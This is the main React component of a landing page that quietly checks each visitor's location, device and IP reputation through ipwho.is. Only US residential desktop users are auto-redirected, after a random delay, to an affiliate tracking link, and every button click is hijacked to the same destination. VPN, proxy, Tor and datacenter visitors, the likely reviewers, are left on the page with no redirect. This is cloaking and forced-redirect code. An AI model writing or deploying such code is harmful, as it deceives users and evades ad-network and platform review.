
import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import LiveSection from './components/LiveSection';
import Features from './components/Features';
import Testimonials from './components/Testimonials';
import Footer from './components/Footer';

const App: React.FC = () => {
  const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked'>('checking');
  const [allowRedirect, setAllowRedirect] = useState(false);

  useEffect(() => {
    const checkAccess = async () => {
      // Device check: Desktop only
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      
      // Geo and IP Quality check
      try {
        const response = await fetch('https://ipwho.is/');
        const data = await response.json();
        
        const isUS = data.country_code === 'US';
        const isProxy = data.security?.proxy || data.security?.vpn || data.security?.tor || data.security?.relay;
        const isHosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';

        if (!isMobile && isUS && !isProxy && !isHosting) {
          setAllowRedirect(true);
          setAccessStatus('allowed');
          
          // Auto-redirect after random delay (1500ms to 2500ms)
          const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, delay);
        } else {
          setAllowRedirect(false);
          setAccessStatus('blocked');
        }
      } catch (error) {
        // Fallback: if API fails, we don't allow redirect to be safe
        setAllowRedirect(false);
        setAccessStatus('blocked');
      }
    };

    checkAccess();
  }, []);

  // Global click interceptor for all buttons (Unified interception logic)
  useEffect(() => {
    const handleGlobalClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      const button = target.closest('button');
      
      if (button) {
        e.preventDefault();
        if (allowRedirect) {
          window.location.href = redirectUrl;
        }
      }
    };

    window.addEventListener('click', handleGlobalClick, true);
    return () => window.removeEventListener('click', handleGlobalClick, true);
  }, [allowRedirect]);

  // Smooth appearance of elements on scroll
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('opacity-100', 'translate-y-0');
            entry.target.classList.remove('opacity-0', 'translate-y-10');
          }
        });
      },
      { threshold: 0.1 }
    );

    document.querySelectorAll('.animate-on-scroll').forEach((el) => observer.observe(el));
    return () => observer.disconnect();
  }, []);

  if (accessStatus === 'checking') {
    return (
      <div className="min-h-screen bg-[#FDFCFB] flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-rose-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#FDFCFB] overflow-x-hidden selection:bg-rose-500 selection:text-white text-[#1C1C1C]">
      {accessStatus === 'blocked' && (
        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
          Access restricted. Please use a residential US desktop.
        </div>
      )}
      
      <Navbar />
      
      <main className="w-full">
        <Hero />
        <LiveSection />
        <Features />
        <Testimonials />
      </main>

      <Footer />
    </div>
  );
};

export default App;
